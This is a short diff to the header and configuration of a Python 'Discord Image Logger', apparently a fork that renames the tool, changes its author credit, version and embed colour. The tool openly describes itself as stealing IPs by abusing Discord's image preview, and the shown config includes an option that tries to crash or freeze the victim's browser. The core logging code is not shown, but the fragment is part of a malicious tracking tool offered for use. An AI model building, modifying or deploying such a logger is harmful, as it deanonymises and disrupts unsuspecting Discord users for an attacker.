@@ -1,14 +1,14 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# By DeKrypt, updated by Oxide_stg (molotovcolen) | https://github.com/dekrypted / https://github.com/MolotovColen
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__app__ = "Oxide's Logger"
+__description__ = "tweaked discord image logger"
+__version__ = "v4.0"
+__author__ = "DeKrypt/Oxide_stg"
 
 config = {
     # BASE CONFIG #
@@ -19,7 +19,7 @@ config = {
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
